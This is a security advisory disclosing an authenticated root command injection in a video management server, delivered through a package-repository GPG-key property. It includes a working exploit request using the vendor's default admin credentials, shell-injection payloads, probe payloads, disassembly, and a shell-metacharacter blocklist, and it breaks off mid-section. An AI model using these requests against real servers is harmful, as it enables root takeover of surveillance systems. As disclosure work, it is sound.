# IPConfigure Orchid VMS 26.3.0 — Authenticated Command Injection in the DNF Repository GPG-Key Import Path (root RCE)

A server property that names the GPG key of the vendor's DNF repository is accepted through the authenticated management API without any character validation, persisted to the server properties file, and later interpolated by the package-management background thread into an unquoted `rpm --import {}` command that is handed to `popen()`. An authenticated caller holding the `config` permission therefore executes arbitrary shell syntax as uid 0 on the video management server. This finding is post-authentication root remote code execution, with a 173-line dynamic verification transcript and root-owned marker artifacts. No unauthenticated route to this sink exists, and the exhaustion evidence behind that claim is reproduced in section 3.

## 1. Overview

### Overview — the product and its packaging identity

IPConfigure Orchid VMS (installed as "Orchid Recorder") is a closed-source video management system written in C++ and shipped as native binaries plus a set of proprietary shared libraries. The vendor is IPConfigure, Inc., of Norfolk, Virginia, United States; the product is sold into physical-security and surveillance deployments, which places it in the critical-infrastructure-adjacent category where a compromised recording server yields both video evidence manipulation and a foothold on a physically secured network.

The artifact analysed here is the vendor's Debian bundle, retrieved over HTTPS from the vendor's public download host without registration:

```text
installed bundle    : the vendor's Debian bundle for package ipc-orchid, control
                      Version 26.3.0, Architecture amd64, 129 MB as downloaded; the
                      research record does not preserve this bundle's file name, so no
                      file name is quoted here
bundle sha-256      : recorded as the prefix 1fe6ee62... only - the full digest was not
                      written down at download time; integrity was established instead
                      by an xz test of the archive's data member, which passed
discarded download  : a separate 26.3.2 bundle from the same host, transfer-corrupted
                      (49,475,584 bytes against roughly 127 MB expected; its
                      data.tar.xz member began with 32 zero bytes and orchid_server
                      was unrecoverable) - no figure in this advisory comes from it
control:Package     : ipc-orchid
control:Version     : 26.3.0
control:Architecture: amd64
control:Depends     : debconf, avahi-daemon, libnss-mdns
control:Description : Orchid Recorder
self-reported version (unauthenticated API) : 26.3.0
```

The bundle that was installed and exploited is the one the control metadata above describes, `Version: 26.3.0`, and it is the only artifact behind any offset, library listing or transcript in this advisory. A separate `26.3.2` bundle from the same host was downloaded and discarded: it arrived truncated at 49,475,584 bytes against roughly 127 MB expected, and its `data.tar.xz` member was corrupted in transfer, the first 32 bytes being zero, so `orchid_server` could not be recovered from it. The `26.3.2` identifier therefore belongs to a bundle that was never usable, not to the artifact behind any offset, library listing or transcript here. The unauthenticated version endpoints confirm the installed version at runtime:

```http
GET /service/about HTTP/1.1
Host: <lab-host>

HTTP/1.1 200 OK
Content-Type: application/json

{"sprouts":[],"version":"26.3.0"}
```

```http
GET /service/version HTTP/1.1
Host: <lab-host>

HTTP/1.1 200 OK
Content-Type: application/json

{"brand":"orchid","buildDate":"<redacted>","license":"trial","locale":"en","version":"26.3.0"}
```

Affected-version statements in this advisory therefore use `26.3.0`, the value the product itself reports and the value in the package control metadata. This is the artifact-identity statement a third party would use to reproduce the work, so it is written out in full: the installed and dynamically exploited artifact was the vendor's Debian bundle for `ipc-orchid` at control `Version: 26.3.0`, `Architecture: amd64`, 129 MB as downloaded over HTTPS from the vendor's public download host without registration. The research record preserves that bundle's SHA-256 only as the prefix `1fe6ee62...`, the full digest not having been written down at download time; its integrity was established instead by an `xz` test of the archive's data member, which passed. Two consequences are stated rather than papered over. Re-fetching the same `26.3.0` bundle from the vendor will reproduce the offsets quoted here, because they were read from binaries installed from it, but a bit-for-bit match against our own copy cannot be asserted from the record. And the separately downloaded `26.3.2` bundle, discarded as transfer-corrupted, is not the source of any figure here.

### Overview — the runtime topology

The installed layout, taken from the package tree, is:

```text
/opt/orchid/bin/orchid                      (1,212-byte bash wrapper: execs orchid_server, records exit code)
/opt/orchid/bin/orchid_analytics_server     (420,689 bytes)
/opt/orchid/bin/orchid_restart_controller
/opt/orchid/bin/onvif_autodiscovery_service(199,681 bytes)
/opt/orchid/bin/orchid_server               (main VMS process; not present in the partially extracted tree kept for this write-up, analysed from the deployed installation)
/opt/orchid/lib/liborchid_*.so             (proprietary libraries: the research record counts 70+
                                            in the full extraction, the partial tree retained for
                                            this write-up holds 57)
/opt/orchid/lib/libPoco*.so.112            (POCO C++ framework, bundled at 1.12)
/opt/orchid/lib/libpackage_minder.so       (619,913 bytes at /opt/orchid/lib/ — the library containing the sink)
/opt/orchid/share/orchid-html              (Angular single-page application + OpenAPI spec)
/opt/orchid/orchid_server.properties.default
/etc/opt/orchid_server.properties           (live properties file; server started with -c /etc/opt)
/var/lib/orchid_server/orchid.sqlite
/var/log/orchid_server
```

Systemd unit shipped by the package (`/etc/systemd/system/orchid.service`):

```ini
[Unit]
Description=Orchid Recorder
After=orchid_smart_search_postgres.service
Wants=orchid_smart_search_postgres.service orchid_analytics.service

[Service]
EnvironmentFile=/etc/opt/orchid_jemalloc.conf
Environment=HOME=/opt/orchid/bin
Environment=GST_PLUGIN_SCANNER=/opt/orchid/libexec/gstreamer-1.0/gst-plugin-scanner
Environment=XDG_CACHE_HOME=/opt/orchid/bin/.orchid_cache
ExecStart=/opt/orchid/bin/orchid -c /etc/opt
Restart=on-failure
RestartSec=0.1
StartLimitInterval=0
TasksMax=infinity
StandardOutput=null
StandardError=journal

[Install]
WantedBy=multi-user.target
```

The `[Service]` section contains no `User=` and no `Group=` directive. The unit runs as whatever the service manager runs as, i.e. uid 0, and `orchid_server` inherits that identity together with every child process it spawns. This is verified dynamically in section 9 and it is the reason the injection in this advisory terminates at root rather than at an unprivileged service account.

Network services: the HTTP management API and web UI on the configured `webserver.port` (the shipped default in `orchid_server.properties.default` is `80`; the lab instance was moved to `8080`), RTSP on 554, ZeroMQ camera discovery on `tcp://localhost:5565`, and a dynamic-configuration signal receiver on 5566.

### Overview — the vulnerability in one paragraph

The property `package.dnf.repo.gpg_key` is intended to hold the URL or path of the GPG public key that signs the vendor's RPM repository. It is writable through `PUT /service/server/properties` and `POST /service/server/properties`, both documented as requiring the `config` permission, and it is validated nowhere between the JSON parser and the shell. On server start or restart, `Package_Minder_Thread` builds the string `rpm --import <value>` by formatting the unquoted template `rpm --import {}` with `fmt::v9::vformat`, and executes the result through `popen()` — that is, through `/bin/sh -c`. Any shell metacharacter in the property value (`;`, `|`, `&`, backtick, `$()`, redirections) is therefore interpreted by the shell as command syntax, and the command runs with the uid of the server: 0.

### Overview — what this document does and does not demonstrate

Demonstrated: the property-write request, accepted with HTTP 200 under HTTP Basic authentication; the resulting service restart; the creation of root-owned marker files whose content proves that command substitution inside the payload was evaluated by a shell; and repeatability across service restarts. Not demonstrated: a reverse shell (payload form documented but never executed), exploitation on a native RHEL-family host (the DNF platform branch was entered on a Debian-family lab container by making the host present as RHEL — see section 9), any Windows build, and any privilege-lowering negative test with a non-Administrator session. Section 9 states each of these boundaries explicitly.

## 2. Vulnerability Summary

### Vulnerability Summary — the root cause

A configuration value that is destined for a shell command line is treated as a shell command line. The defect is a missing quoting/escaping layer at the single point where the property is turned into a `popen()` argument:

```c
// reconstructed intent of ipc::orchid::DNF_Package_Config::import_repo_gpg_key_()
std::string gpg_key = properties.getString("package.dnf.repo.gpg_key", <default>);
std::string cmd = fmt::v9::vformat("rpm --import {}", fmt::make_format_args(gpg_key));
FILE *f = popen(cmd.c_str(), "r");   // /bin/sh -c "rpm --import <attacker value>"
```

The template literal carries no quotes around the placeholder, `fmt` performs no shell escaping (it is a string formatting library, and escaping is not one of its responsibilities), and no filter, allowlist or length check is applied to the property value on the way in. Three independent layers that could each have stopped the injection — quoting at the command-construction site, validation at the property-write API, and privilege separation at the service level — are all absent.

### Vulnerability Summary — classification

- **CWE-78** — Improper Neutralization of Special Elements used in an OS Command: the property value is concatenated into a command string executed by `/bin/sh -c`.
- **CWE-20** — Improper Input Validation: the properties API accepts arbitrary characters for a value that has a documented shape (a key URL or file path).
- **CWE-798** — Use of Hard-coded Credentials: the installer's debconf template declares `Default: pass` for the administrator password, which makes the administrative precondition free on any installation that accepts the default (see section 3).
- **CWE-250** — Execution with Unnecessary Privileges: the server unit has no `User=` directive, so the injected command runs as root instead of a dedicated service account.
- **CVSS**: primary 7.2 High — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`; a conditional 9.8 Critical reading applies to installations that still accept the factory-default administrator password, vector `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`. Both are derived and justified in section 12.

### Vulnerability Summary — what is not being claimed

This is not an unauthenticated vulnerability. The write endpoint is behind authentication and the scope model in the shipped OpenAPI specification assigns `config` to the Administrator role only. It is not a memory-safety bug, not a deserialization bug, and not a privilege-boundary crossing between two products: it is a classic unescaped-shell-interpolation defect whose severity comes from where the process happens to run. It is also not the previously public path traversal in this product family; section 10 separates the two.

## 3. Authentication Boundary

### Authentication Boundary — four accepted credential carriers

The management API lives under `/service/` and accepts four equivalent authentication carriers, declared in the specification as the `AuthTypes` anchor and applied to authenticated operations as `security: *AUTH_TYPES`:

```yaml
components:
  AuthTypes:  &AUTH_TYPES
    - basic_auth: []
      session_auth: []
      session_cookie: []
      jwt_auth: []
```

- **HTTP Basic** — `Authorization: Basic base64(username:password)`; used for every request in this research.
- **User session** — `Authorization: Bearer <user-session-id>`, or the `sid` query parameter, or the server-set session cookie used by the web UI. Sessions are created by `POST /service/sessions/user`.
- **Remote session** — bearer token bound to a trusted issuer with custom permissions.
- **JWT** — HS256 tokens validated against a registered trusted issuer's JWK; the specification notes that a JWT carrying no `scope` claim is treated as having Administrator permissions.

Authentication priority is documented as: authorization header (Basic, then Session, then JWT), then query string, then cookie; the first carrier discovered is the only one evaluated. Password storage uses SHA-1 according to the research record — weak, but irrelevant here, because the chain demonstrated does not rely on cracking anything.

### Authentication Boundary — the scope and role model, quoted from the shipped specification

The product defines a two-part authorization model: a **Base Scope** that applies to all cameras and **Camera Scopes** that override per camera. The permission vocabulary and the role-to-permission mapping are printed verbatim in the specification's own authorization section (file `/opt/orchid/share/orchid-html/openapi-spec/orchid_swagger.yaml`, 10,799 lines, MD5 `074b8136552bbb861f09516bfda500c0`, 343,584 bytes, shipped inside the web root):

```text
| Permission | Description |
|config  |Allows a user to manage the Orchid Recorder system and perform tasks such as: configure cameras, manage user accounts, and manage Orchid Recorder licensing.|
|monitor |Allows a user to have read-only access to system components that normally require `config`.|
|stats   |Allows a user to view all events in Orchid Recorder and view the current status of cameras.|
|export  |Allows a user to export media.|
|ptz     |Allows a user to perform PTZ actions on a camera.|
|playback|Allows a user to view playback streams and motion events.|
|live    |Allows a user to view live streams.|
|talk    |Allows a user to send audio to the camera.|

| Role | Scope |
|Administrator|baseScope: [live, playback, ptz, export, talk, stats, config]|
|Manager      |baseScope: [live, playback, ptz, export, talk, stats]|
|Viewer       |baseScope: [live, playback]|
|Live Viewer  |baseScope: [live]|
```

The same four role names appear as a closed enum in the specification's user schema (`Administrator`, `Manager`, `Live Viewer`, `Viewer`). Read against the endpoint's own authorization block:

```text
/server/properties  PUT   operationId: putServerProperties
                          "Replace the current properties file with the properties uploaded."
                          ## Authorization
                          **Scope**: config
                          **Type**: Base
/server/properties  POST  operationId: postServerProperties
                          ## Authorization
                          **Scope**: config
                          **Type**: Base
/server/properties  GET   operationId: getServerProperties
                          ## Authorization
                          **Scope**: config | monitor
```

...the consequence is unambiguous and it matters for scoring: reading the loaded properties is available to `config` or `monitor`, but writing them requires `config`, and exactly one of the four shipped roles holds `config` in its base scope — Administrator. Manager, Viewer and Live Viewer sessions are not granted it. The specification lists `403 Forbidden` among the responses of both write operations, consistent with a role check that can fail closed. This is the evidence on which the `PR:H` primary metric in section 12 rests, and it is the reason this advisory does not adopt the `PR:L` figure carried by the internal research record.

The research did not empirically test a Manager or Viewer session against the PUT (no lower-privileged account was provisioned in the lab); the restriction above is taken from the vendor's own shipped authorization documentation, which is the authoritative statement of the model.

### Authentication Boundary — the factory-default administrator password is an installer default, not a lab choice

The Debian package declares a debconf question for the administrator password and gives it a literal default value. Quoted from the `templates` member of the package control archive:

```text
Template: ipc-orchid/admin_password
Type: password
Default: pass
Description: Default admin password.
```

and the `preinst` script consumes it on a fresh installation, writing it into the server properties file in clear text:

```bash
    db_input high ipc-orchid/admin_password || true
    db_go || true
    ...
    db_get ipc-orchid/admin_password
    echo "orchid.admin.password: ${RET}" >> ${ORCHID_PROP_FILE_PATH}
    ...
    # After these settings are replaced, purge the settings DB. This will prevent someone from looking up the admin password.
    db_reset ipc-orchid/admin_password
```

where `ORCHID_PROP_FILE_PATH='/etc/opt/orchid_server.properties'`. Three properties of this code path are security-relevant:

1. The default value is `pass`, declared by the vendor in the shipped package — not chosen by this research.
2. The question is only asked when no properties file exists yet, i.e. on a first install; and any non-interactive or preseeded install (the normal case for automated VMS rollouts) resolves `db_get` to the declared default `pass`.
3. The resulting password is written in clear text into `/etc/opt/orchid_server.properties` and only then purged from the debconf database; the installer comment shows the vendor is aware that the value is otherwise recoverable. No claim is made here about that file's permissions, because no inspected artifact establishes them: neither `preinst` nor `postinst` sets a mode on that path, and the only `chmod` in those two scripts is `700`, applied to the smart-search database directory.

No forced rotation on first login is present in the installer artifacts inspected. The record confirms the working credential dynamically: `admin` / `pass` returns HTTP 200 where any other password returns 401.

### Authentication Boundary — the gate observed dynamically

```text
GET /service/sessions/... and PUT /service/server/properties under three credential states

[no Authorization header at all]        401 Unauthorized
[HTTP Basic, wrong password]            401 Unauthorized
[HTTP Basic, admin:pass]                200 OK
```

The 401 body is the product's standard form `{"code":401,"reason":"Authorization failed"}`. Authentication is therefore genuinely enforced on the vulnerable resource; the finding sits behind it.

### Authentication Boundary — why this is not classified as unauthenticated: the exhaustion record

The classification "post-authentication" is only creditable if the unauthenticated surface was actually exhausted rather than assumed. The research performed that exhaustion dynamically, and the result is what makes a `PR:N` claim unavailable to us except through the default-credential argument in section 12.

```text
OpenAPI specification paths declared              : 58
paths carrying security: *AUTH_TYPES              : 56
authenticated operations re-tested with no creds  : 86  -> 401 every time
authenticated operations re-tested with bad creds : 86  -> 401 every time
unauthenticated API endpoints found               : 5   (all read-only GET, all parameterless)
unauthenticated static/SPA responses found        : /, /index.html, /api, /api/, /robots.txt
login endpoint                                    : POST /service/sessions/user (needs valid credentials)
authentication-configuration misfires found       : 0
```

The five unauthenticated API endpoints are `GET /ping` (fixed response `pong!`), `GET /service/about` (version JSON), `GET /service/version` (brand, license, locale, version, build identifier), `GET /service/time` (epoch milliseconds as text) and `GET /service/time-extended` (time plus timezone JSON). Each was probed per parameter and per header with command-injection, path-traversal, SSRF, SSTI, SQL-injection and NoSQL-injection payloads; none of the five accepts any parameter at all, and none reaches a sink. Representative results:

```text
GET /service/time?x=;id>/tmp/orchid_unauth_rce_marker     -> 400 Illegal characters in URI query
GET /service/time?x=$(id)                                 -> 400 Illegal characters in URI query
GET /service/time?tz=../../etc/passwd                     -> 200 (parameter ignored, returns current epoch ms)
GET /service/time-extended?tz=America/New_York            -> 200 (tz field stays "GMT+", parameter ignored)
GET /service/about?version=../../etc/passwd               -> 200 fixed {"sprouts":[],"version":"26.3.0"}
GET /ping/../etc/passwd                                   -> 400 Illegal characters in URI path
```

Nine path-traversal encodings (including double-encoded, overlong-UTF-8 and null-byte variants) were rejected before normalization by POCO's URI filter with `400 Illegal characters in URI path`, and more than twenty authentication-bypass techniques failed: verb tampering, `X-HTTP-Method-Override`, `X-Original-URL`, `X-Forwarded-For`/`X-Forwarded-Host` trust, forged session cookies and bearer tokens, forged Basic credentials, `alg=none` JWTs, empty-signature JWTs, scheme-case confusion, duplicate `Authorization` headers, path-prefix and URL-encoding variants, oversized URIs, and type-confusion logins (`{"username":{"$ne":null}}`, array-valued and null-byte usernames). The only anomaly found was an unauthenticated-reachable 500 with the message `Type is not convertible to string` on the login endpoint under type confusion — an information-leak and robustness defect, not an authentication bypass and not a sink.

One authenticated shell sink outside the package manager was chased to a definitive negative and is documented here because it explains why the DNF path is the interesting one: `POST /service/system/time` takes a `tz` field that is interpolated into `timedatectl set-timezone '{}'` and executed through the same `popen` machinery. That handler strips a 21-character blocklist before interpolation, and `'` (0x27) is in the blocklist, so the single-quoted context cannot be escaped. Section 5 reproduces that evidence and contrasts the two code paths.

## 4. Attack Surface

### Attack Surface — the properties resource family

Everything the attacker needs is on one resource family. The full inventory from the specification, with the observed unauthenticated response:

```text
GET  /service/server/properties            getServerProperties           scope: config | monitor   AUTH 401
PUT  /service/server/properties            putServerProperties           scope: config             AUTH 401
POST /service/server/properties            postServerProperties          scope: config             AUTH 401
GET  /service/server/properties/info       getServerPropertiesInfo       scope: config | monitor   AUTH 401
GET  /service/server/properties/confirmed  getServerPropertiesConfirmed  scope: config             AUTH 401
POST /service/server/properties/confirmed  postServerPropertiesConfirmed scope: config             AUTH 401
```

Semantics that matter for exploitation, quoted from the specification:

```text
PUT  — "Replace the current properties file with the properties uploaded.
        On success the server will restart if either enableDynamicReload is set to false
        or a non-dynamic property is changed.
        Depending on unsafeSkipConfirmation, after the restart, the changes need to be
        confirmed. If the changes are not confirmed before the confirmation timer runs out
        (5 minute countdown), the previous properties file will be restored and the server
        will restart. If the uploaded list of properties attempts to add, modify, or remove
        any locked properties, the request will fail. ..."
POST — "Update the current properties file with the properties uploaded."
       same restart / confirmation / locked-property semantics
GET /server/properties/info — "Get information for properties that can be set in the properties
       file. This includes a description about what the property does, and if it is a locked
       property or not. Locked properties cannot be added, removed, or have their value changed
       through the API."
```

Three attacker-relevant consequences: the PUT is a whole-file replacement, so the request must carry all currently loaded properties or it is rejected; the restart that triggers the sink is a built-in side effect of the write, so no operator action and no second request is needed (`UI:N`); and `GET /server/properties/info` hands the attacker the vendor's own description of every settable property together with its locked flag, which is how a caller identifies `package.dnf.repo.gpg_key` as both writable and dangerous-sounding rather than guessing.

### Attack Surface — the properties that reach the package manager

The `package.*` namespace drives `Package_Minder_Thread`:

```text
package.config_mode            selects the package-management mode; "disabled" short-circuits the thread, "default" proceeds
package.dnf.repo.name          repository identifier used to build /etc/yum.repos.d/ipconfigure.repo
package.dnf.repo.url           baseurl written into the generated repo file
package.dnf.repo.channel       repository channel
package.dnf.repo.gpg_key       GPG key URL/path  <-- interpolated into a shell command (this finding)
package.apt.repo.*             APT-side equivalents; the key is bundled in the package, not URL-driven (not a shell sink)
```

The shipped default template `/opt/orchid/orchid_server.properties.default` contains none of these keys:

```ini
webserver.port: 80
webserver.protocol: http
webserver.html.rootpath: /opt/orchid/share/orchid-html
cameradiscovery.publisher.uri: tcp://localhost:5565
sqlite.filepath: /var/lib/orchid_server/orchid.sqlite
archivecleaner.usedspace.percentage: 85
archivecleaner.periodic.seconds: 60
severity.console.default: warning
severity.file.default: normal
logger.dir: /var/log/orchid_server
rlimit.openfiles.max: 65535
rlimit.stack.max: 2147483647
smart_search.postgres.storage_location: /var/lib/orchid_server/smart_search_db
```

Thirteen keys, no `package.*` entry. A deployed instance nevertheless exposes the `package.*` keys through `GET /service/server/properties` — the research instance returned 24 properties including the whole DNF group — so something other than that shipped default template supplies them on a deployed instance, and this research did not establish which of two mechanisms does. Either the running server materializes these keys itself from built-in defaults, or the installer merges them in: `postinst`, which is present in the retained control archive, carries a `merge_properties` routine that it calls to merge the live properties file with a shipped defaults file, and it also defines a path for an `orchid_server.defaults.properties` that is absent from the retained package tree, so that file's contents could not be read. Neither mechanism was observed at work on the deployed instance, and both are recorded here as unproven rather than one being asserted. Operationally this means the attacker does not need the key to pre-exist: the exploit reads the current property set and appends or overwrites `package.dnf.repo.gpg_key`, which is exactly what the released proof of concept does. The key is also demonstrably not a *locked* property, since the write returned HTTP 200 and the value survived repeated restarts (section 9).

### Attack Surface — surfaces examined and not pursued

RTSP on 554 (`rtsp://<lab-host>:554/orchid/{live,playback,test}`), the ZeroMQ camera-discovery publisher on `tcp://localhost:5565` and the dynamic-configuration receiver on 5566 are proprietary non-HTTP services that were enumerated but not reverse-engineered in depth; the management-API chain succeeded and those services were left. `liborchid_webserver_modules.so` was analysed only as far as the `/service/system/time` handler described in section 5. Camera CRUD, trusted-issuer registration, archive download and user management endpoints were probed for injection during the authenticated pass with no second sink confirmed. This is a declared boundary of the work, not a claim that those surfaces are clean.

## 5. Sink Identification

### Sink Identification — the vulnerable function

Binary `/opt/orchid/lib/libpackage_minder.so`, 619,913 bytes, installed at `/opt/orchid/lib/`. Function `ipc::orchid::DNF_Package_Config::import_repo_gpg_key_()` at offset `0x654d0` (2,407 bytes). Disassembly from the research record:

```asm
;-- ipc::orchid::DNF_Package_Config::import_repo_gpg_key_():
0x000654d0  endbr64
0x000654d4  push r15
0x000654d6  mov  ecx, 0xd                     ; 0xd = 13 = length of "rpm --import {}" minus terminator handling
0x000654db  lea  rsi, str.rpm___import_       ; 0x758d5 ; "rpm --import {}"   <-- UNQUOTED TEMPLATE
0x000654e2  push r14
...
0x000654f4  mov  rdx, qword [rdi + 0xb8]      ; gpg_key property value (std::string data pointer)
...
0x0006554b  call method.fmt::v9::vformat[abi:cxx11](...)  ; format the template with gpg_key
...
; the formatted string is passed to popen() -> /bin/sh -c
```

Cross-reference confirming the template is loaded from read-only data at that address:

```text
method.ipc::orchid::DNF_Package_Config.import_repo_gpg_key___ 0x654db [DATA:r--] lea rsi, str.rpm___import_
```

### Sink Identification — the string table

```text
210  0x000758d5  15  16  .rodata  ascii  "rpm --import {}"
 92  0x00074df0  48  49  .rodata  ascii  "Successfully imported the repository GPG key: {}"
```

The first entry is the command template: fifteen characters, and the placeholder is surrounded by nothing — no single quote, no double quote, no `--` end-of-options marker, no escaping convention. The second entry shows the same unescaped-interpolation habit in the success logging path, which is harmless for a log line but establishes that `fmt` is used here as a plain string builder with no security semantics anywhere in the function.

### Sink Identification — why no quoting or filter applies

Three facts, each independently sufficient:

1. **The template is unquoted at the construction site.** `rpm --import {}` yields `rpm --import http://x;id;#`. Because the substituted value is not inside quotes, the shell sees `;` as a command separator, not as part of a URL. Had the template been `rpm --import '{}'`, the `;` would have been literal — and the `'` character, which the sibling `timedatectl` handler strips, would then have been the only thing standing between the property and the shell.
2. **`fmt::v9::vformat` is a formatting library.** It performs brace substitution and format-specifier handling. It has no notion of a target interpreter, hence no notion of escaping for one; asking it to produce shell-safe output is a category error, and the code asks it for exactly that.
3. **The property-write API applies no character filter.** The value that arrives in `/etc/opt/orchid_server.properties` is byte-identical to the JSON string the API accepted, as observed on the target during verification (section 9). There is no metacharacter blocklist on this path — the contrast with `/service/system/time` in the same product, where a 21-character blocklist is applied before interpolation, shows the codebase does contain the safer pattern and simply does not use it here.

### Sink Identification — the contrasting handler in the same product proves the filter is a deliberate pattern

Handler `ipc::orchid::System_Module::process_tz_request_(Json::Value const&)` at `0x440f30` in `/opt/orchid/lib/liborchid_webserver_modules.so` (6,345,633 bytes) feeds `POST /service/system/time`:

```text
0x440f6b  operator[]("tz")                     ; JSON field extraction
0x440f8e  isNull() / isString()                ; type validation
0x440fae  asString()                           ; -> std::string
0x441066-0x4410e3  blocklist filter loop       ; memchr(blocklist, c, 21) @ 0x4410ca:
                                               ;   hit  -> character dropped (not copied)
                                               ;   miss -> character copied to output buffer
0x4411f0  fmt::v9::vformat(SET_TZ, filtered)   ; SET_TZ @ 0x4cab20 = "timedatectl set-timezone '{}'"
0x44124f  virtual call [rax+0x10]              ; -> System interface implementation
```

```text
blocklist @ 0x47f340, 21 bytes:
hex: 26 7c 3b 3c 3e 28 29 7b 7d 24 27 22 2a 3f 5b 5d 23 7e 3d 25 60
str: & | ; < > ( ) { } $ ' " * ? [ ] # ~ = % `
```

The command then reaches `popen()` inside `orchid_server` via `ipc::orchid::UNIX_Machine::virtual_32` (the `popen` import itself resolves at `0x7e220`), and the HTTP 422 error text carries `WEXITSTATUS << 8` of the shell's exit code. Two conclusions follow, and they are load-bearing for this advisory:

- The product's command-execution idiom is `fmt::vformat` into a template string followed by `popen()` — the same idiom that is defective in the DNF path. The sink mechanism is not an artifact of this research's reading; it is confirmed twice in two different libraries.
- The vendor knows how to filter: the `tz` handler drops all 21 shell metacharacters *and* the single quote, and dynamic testing confirmed the filter holds (an injection payload returned HTTP 422 with return code 256 and created no marker file). The same discipline is missing on the `gpg_key` path, and that asymmetry — plus the fact that the DNF template is unquoted while the `tz` template is quoted — is the whole difference between an exploitable and a non-exploitable pair of sinks in one product.

### Sink Identification — the APT sibling is a file write, not a shell command

`ipc::orchid::APT_Package_Config::install_repo_keyring_if_necessary_()` at `0x532a0` in the same library installs the GPG keyring for Debian-family targets by writing the key material that ships inside the product (`ipc-orchid.gpg`, identity `IPConfigure <hostmaster@ipconfigure.com>`) to `/etc/apt/trusted.gpg.d/<name>.gpg`. It does not read `package.apt.repo.gpg_key` from a URL property, and it does not build a shell command. Debian/Ubuntu installations therefore never reach the vulnerable sink through key installation, which is why section 10 scopes the impact to the DNF platform branch.

## 6. Source Identification

### Source Identification — the tainted value and where it lives

Source: the server property `package.dnf.repo.gpg_key`, stored in `/etc/opt/orchid_server.properties`. The server is started with `-c /etc/opt`, so that directory is the configuration root; the file is plain `key: value` text. After injection, the observed file content on the target was:

```ini
# /etc/opt/orchid_server.properties (post-injection, excerpt)
package.dnf.repo.gpg_key: http://x;echo RCE_VIA_ORCHID_DNF_SINK:$(hostname):$(date +%s) > /tmp/orchid_api_rce_proof.txt;#
package.dnf.repo.url: http://x;id>/tmp/orchid_dnf_url_marker;#
package.dnf.repo.channel: stable;id>/tmp/orchid_dnf_channel_marker;#
package.dnf.repo.name: orchid;id>/tmp/orchid_dnf_name_marker;#
package.config_mode: default
```

The `#` at the end of the first line is part of the injected payload, not a file comment, and the file faithfully preserves every metacharacter — there is no escaping or truncation between the API request body and the on-disk value.

### Source Identification — the write that taints it

```http
PUT /service/server/properties HTTP/1.1
Host: 127.0.0.1:8080
Authorization: Basic YWRtaW46cGFzcw==
Content-Type: application/json

{"properties":[
  {"name":"archivecleaner.periodic.seconds","value":"60"},
  ... all currently loaded properties, locked ones reproduced unchanged ...,
  {"name":"package.dnf.repo.gpg_key","value":"http://x;echo CLEAN_API_RCE_PROOF:$(id -u):$(whoami) > /tmp/orchid_clean_api_rce_proof.txt;#"},
  {"name":"package.dnf.repo.url","value":"http://x"},
  {"name":"package.dnf.repo.name","value":"orchid"},
  {"name":"package.dnf.repo.channel","value":"stable"},
  {"name":"package.config_mode","value":"default"}
]}

HTTP/1.1 200 OK
Content-Type: application/json

{"properties":[{"name":"archivecleaner.periodic.seconds","value":"60"}, ...injected value echoed back... ]}
```

`Authorization: Basic YWRtaW46cGFzcw==` is the base64 of the installer-default credential pair documented in section 3. The body is a whole-file replacement, so every currently loaded property must be resubmitted; omitting a locked one yields `400 Removing locked properties must be performed manually.` The successful response echoes the injected value back verbatim, which is itself a confirmation that no sanitization occurred server side. The write causes the server to restart (default `enableDynamicReload=false` on PUT), which is what fires the sink without any further attacker action.

### Source Identification — sanitization status: none

Between the JSON parse and the sink there is, per the record and per the observed on-disk value: no allowlist, no blocklist, no URL validation, no shell escaping, no quoting and no length limit. The only structural constraints on the request are the whole-list replacement rule and the locked-property rule, neither of which inspects character content. The `tz` handler demonstrates the vendor's own stronger pattern (drop 21 metacharacters) — it is simply not applied here.

### Source Identification — sibling values in the same namespace

`package.dnf.repo.url`, `.name` and `.channel` reach the generated repository file rather than a shell command line. The template discovered in the lab (and required by the `std::map::at("ipconfigure.repo")` lookup described in section 7) is:

```ini
[ipconfigure]
name=Orchid Recorder
baseurl={}
enabled=1
gpgcheck=1
gpgkey={}
```

Both `baseurl={}` and `gpgkey={}` take values from the same attacker-controlled namespace, and the generated file is copied to `/etc/yum.repos.d/ipconfigure.repo`. That is a configuration-file injection: it can point the system's package manager at an attacker-controlled repository. It is documented here as adjacent surface that needs the same review, and the research did set metacharacter payloads into `.url`, `.name` and `.channel` during testing. Only the `gpg_key` sink has confirmed command-execution marker evidence, so only that one is claimed as a finding; the sibling properties are listed as unexercised adjacent surface, not as additional exploited sinks.

## 7. Data Flow

### Data Flow — the static call chain, with offsets

The path from process start to the shell, as traced in `orchid_server` and `libpackage_minder.so`:

```text
orchid_server main
  -> Package_Minder setup                                    @ 0xae4c4 (orchid_server)
       0xaedcf: cmp byte [rsi + 0x121], 0      ; no_exec_lock flag gate
       0xaeec0: read package.config_mode       ; property read from /etc/opt/orchid_server.properties
       0xaf203: call Linux_Package_Facilitator::create_package_config(bool)
       0xaf213: test r12, r12; je 0xaf5ba      ; null => "platform not supported"
       0xaf219: "disabled" check               ; config_mode == "disabled" skips the thread body
       0xaf230: "default" check                ; config_mode == "default" proceeds
       0xaf2b5: mov ecx, 0xe10                 ; 0xe10 = 3600s license_check_interval
  -> Linux_Package_Facilitator::create_package_config         @ 0x3f6c0 (libpackage_minder.so)
       0x3f6f3: cmp eax,1; je APT branch        ; platform id 1 = APT
       0x3f6fc: cmp eax,2; je DNF branch        ; platform id 2 = DNF  <-- the vulnerable branch
  -> Linux_Package_Facilitator::find_package_config_type_     @ 0x3be20
       parses /etc/os-release:
         ID=ubuntu      / ID_LIKE=debian  -> 1 (APT)
         ID=rhel        / ID_LIKE=rhel    -> 2 (DNF)
  -> DNF_Package_Config::setup_repo_if_necessary_             @ 0x65eb0
       -> install_repo_file_if_necessary_                     @ 0x64180
            guard @ 0x641ab -> verify_repo_file_ @ 0x1eea0
            generates the repo file from the templates map (std::map::at("ipconfigure.repo"))
            copies it to /etc/yum.repos.d/ipconfigure.repo
       -> import_repo_gpg_key_                                @ 0x654d0   <-- SINK
            fmt::v9::vformat("rpm --import {}", gpg_key)
            -> popen(command, "r")
            -> /bin/sh -c "rpm --import <attacker value>"
```

The property value itself enters the sink function through the object's own member: `mov rdx, qword [rdi + 0xb8]` loads the `std::string` holding `gpg_key` from the `DNF_Package_Config` instance at offset `0xb8`, i.e. the value cached when the configuration object was built from the properties file — the same file the API just rewrote.

### Data Flow — end to end, from HTTP request to uid 0

```text
 [attacker]   PUT /service/server/properties   (HTTP Basic, config-scope session)
     |          body: {"properties":[ ... , {"name":"package.dnf.repo.gpg_key",
     |                                       "value":"http://x;<CMD>;#"} , ... ]}
